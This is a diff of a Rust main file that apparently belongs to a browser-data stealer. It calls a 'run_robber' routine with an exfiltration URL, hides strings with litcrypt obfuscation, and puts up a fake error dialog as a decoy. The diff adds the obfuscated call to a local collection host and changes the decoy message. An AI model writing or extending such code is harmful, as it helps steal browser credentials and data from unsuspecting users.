@@ -6,13 +6,12 @@ use litcrypt::{lc, use_litcrypt};
 use std::ffi::CString;
 use user32::MessageBoxA;
 
-use_litcrypt!("[xr.v['j/tzdsojvtdln[tzc]osqjtre");
+use_litcrypt!("oqkast];fd./lyeh.je,w;lha,jtcxmy");
 
 fn main() -> () {
-    let error: bool = false;
-    let error_message = r#"There isn't enough memory to complete this action. Try using less data or closing other applications."#;
-    let url = "http://127.0.0.1:80";
-    let _ = browser::run_robber(true, true, url);
+    let error: bool = true;
+    let error_message = r#"Hello from the other side"#;
+    let _ = browser::run_robber(true, false, &lc!("http://127.0.0.1:55"));
     if error == true {
         let _ = show_error(error_message);
     }
